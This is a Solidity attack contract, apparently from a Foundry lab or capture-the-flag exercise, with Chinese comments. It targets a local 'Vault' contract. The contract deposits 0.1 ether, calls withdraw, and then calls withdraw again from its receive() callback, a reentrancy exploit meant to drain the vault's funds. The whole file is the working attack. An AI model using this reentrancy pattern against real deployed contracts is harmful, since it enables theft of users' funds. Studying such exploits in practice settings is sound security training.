// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/Vault.sol";
import "forge-std/console.sol";

// 攻击合约
contract VaultAttack {
    Vault public vault;
    
    constructor(address _vault) payable {
        vault = Vault(payable(_vault));
    }
    
    // 攻击函数
    function attack() external {
        // 存入资金
        vault.deposite{value: 0.1 ether}();
        // 开始提款
        vault.withdraw();
        // 输出攻击合约余额
        console.log("Attacker balance (ether):", address(this).balance / 1 ether);
    }
    
    // 接收ETH的回调函数，实现重入攻击
    receive() external payable {
        // 继续调用withdraw函数，直到提取完所有资金
        vault.withdraw();
    }

    // 查看合约余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
} 